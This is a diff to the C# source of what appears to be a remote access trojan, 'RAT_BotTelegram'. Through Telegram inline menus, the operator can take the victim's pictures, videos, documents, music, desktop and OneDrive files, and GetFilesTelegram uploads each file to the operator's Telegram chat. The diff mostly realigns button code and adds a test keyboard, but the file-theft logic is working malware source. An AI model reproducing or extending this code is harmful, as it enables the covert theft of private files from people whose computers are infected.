@@ -69,44 +69,53 @@ namespace RAT_BotTelegram {
                 case "/Get_Files":  // Menú Obtiene archivos
                     var GetFiles = new InlineKeyboardMarkup(new[]{
                     new[]{
-                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Pictures"   ,callbackData: "GetPictures"),
-                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Videos"     ,callbackData: "GetVideos"),
-                    },new[]{
-                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Documents"  ,callbackData: "GetDocument"),
-                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Music"      ,callbackData: "GetMusic"),
-                    },new[]{
-                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Download"   ,callbackData: "getDownload"),
-                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Desktop"    ,callbackData: "getDesktop")
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Pictures"        ,callbackData: "GetPictures"),
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Videos"          ,callbackData: "GetVideos"),
+                    },new[]{                                                                    
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Documents"       ,callbackData: "GetDocument"),
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Music"           ,callbackData: "GetMusic"),
+                    },new[]{                                                                    
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Download"        ,callbackData: "getDownload"),
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Desktop"         ,callbackData: "getDesktop")
                     }});
                     var GetFilesOneDrive = new InlineKeyboardMarkup(new[]{
                     new[]{
-                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Pictures"   ,callbackData: "GetPicturesO"),
-                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"     ,callbackData: "GetVideosO"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Pictures"    ,callbackData: "GetPicturesO"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"      ,callbackData: "GetVideosO"),
 
                     },new[]{
-                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Documents"   ,callbackData: "GetDocumentO"),
-                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Music"       ,callbackData: "GetMusicO"),
-                    },new[]{
-                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Desktop"     ,callbackData: "getDesktopO"),
-                        InlineKeyboardButton.WithCallbackData(text:"Get all files from OneDrive",callbackData: "getAllO")
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Documents"    ,callbackData: "GetDocumentO"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Music"        ,callbackData: "GetMusicO"),
+                    },new[]{                                        
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Desktop"      ,callbackData: "getDesktopO"),
+                        InlineKeyboardButton.WithCallbackData(text: "Get all files from OneDrive" ,callbackData: "getAllO")
                     }});
                     var GetFilesOneDriveE = new InlineKeyboardMarkup(new[]{
                     new[]{
-                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Imagenes"   ,callbackData: "GetPicturesOE"),
-                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"     , callbackData: "GetVideosOE"),
-                    },new[]{
-                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Documentos"  ,callbackData: "GetDocumentOE"),
-                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Música"      ,callbackData: "GetMusicOE"),
-                    },new[]{
-                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Escritorio"  ,callbackData: "getDesktopOE"),
-                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Todos los archivos",callbackData: "getAllO")
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Imagenes"     ,callbackData: "GetPicturesOE"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"       , callbackData: "GetVideosOE"),
+                    },new[]{                                                                     
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Documentos"   ,callbackData: "GetDocumentOE"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Música"       ,callbackData: "GetMusicOE"),
+                    },new[]{                                                                     
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Escritorio"   ,callbackData: "getDesktopOE"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Todos los archivos",callbackData: "getAllO")
                     }});
 
                     await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
                     await Bot.SendTextMessageAsync(config.id, "User Files: "+ Features.getUserName(), replyMarkup: GetFiles);        // Obtiene USER
                     await Bot.SendTextMessageAsync(config.id, "OneDrive Files: |English| ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                     await Bot.SendTextMessageAsync(config.id, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
-                    // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
+                    break;                                                                                                       // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
+                case "/botones":
+
+                    ReplyKeyboardMarkup tipoContacto = new[]
+                    {
+                        new[] { "Opción 1", "Opción 2" },
+                        new[] { "Opción 3", "Opción 4" },
+                    };
+
+                    await Bot.SendTextMessageAsync(config.id, text: "Keyboard personalizado", replyMarkup: tipoContacto);
 
                     break;
                 //Mensaje por default
@@ -258,12 +267,10 @@ namespace RAT_BotTelegram {
             async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
                 await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
                 if (Tools.GetFile(Path).GetValue(0).ToString() == "[-]") {
-                    await Bot.SendTextMessageAsync(config.id, "La carpeta no existe!!");
+                    await Bot.SendTextMessageAsync(config.id, "La carpeta no existe!!, \n\nIntente con otra dirección.");
                 } else {
                     foreach (var file in Tools.GetFile(Path)) {
-
                         if (infoFileZize(file)) {
-
                             switch (GetFileType(file)) {
                                 case "[Imagen]":
                                     if (infoFileZizePhoto(file)) {
@@ -318,13 +325,10 @@ namespace RAT_BotTelegram {
                         } else {
                             await Bot.SendTextMessageAsync(config.id, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
                         }
-
                         await Bot.SendTextMessageAsync(config.id, file);
                     }
                 }
 
-
-                
                 await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
             }
 
@@ -332,12 +336,12 @@ namespace RAT_BotTelegram {
             string user = Features.getUserName();
             switch (callbackQuery.Data) {
                 
-                case "GetPictures": GetFilesTelegram(@"C:\Users\" + user + @"\Pictures");break;                          
-                case "GetVideos":   GetFilesTelegram(@"C:\Users\" + user + @"\Videos"); break;                         
-                case "GetDocument": GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;
-                case "GetMusic":    GetFilesTelegram(@"C:\Users\" + user + @"\Music");break;                    
-                case "GetDownload": GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;                 
-                case "GetDesktop":  GetFilesTelegram(@"C:\Users\" + user + @"\Desktop");break;
+                case "GetPictures":   GetFilesTelegram(@"C:\Users\" + user + @"\Pictures");break;                          
+                case "GetVideos":     GetFilesTelegram(@"C:\Users\" + user + @"\Videos"); break;                         
+                case "GetDocument":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;
+                case "GetMusic":      GetFilesTelegram(@"C:\Users\" + user + @"\Music");break;                    
+                case "GetDownload":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;                 
+                case "GetDesktop":    GetFilesTelegram(@"C:\Users\" + user + @"\Desktop");break;
 
                 // OneDrive Español
                 case "GetPicturesOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Imágenes"); break;                          
@@ -348,11 +352,11 @@ namespace RAT_BotTelegram {
                 case "GetgetAllO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive"); break;
 
                 // OneDrive English
-                case "GetPicturesO": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Pictures"); break;                          
-                case "GetVideosO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                         
-                case "GetDocumentO": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); break;                         
-                case "GetMusicO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); break;                         
-                case "GetDesktopO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;                          
+                case "GetPicturesO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Pictures"); break;                          
+                case "GetVideosO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                         
+                case "GetDocumentO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); break;                         
+                case "GetMusicO":     GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); break;                         
+                case "GetDesktopO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;                          
                 // Other
 
 
@@ -368,7 +372,7 @@ namespace RAT_BotTelegram {
                         longitude: -84.031086f
                         );
                     break;
-                case "GetDocumensdfdst":
+                case "botones":
                     await Bot.SendDocumentAsync(chatId: callbackQuery.Message.Chat.Id,document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
 
                     ReplyKeyboardMarkup tipoContacto = new[]
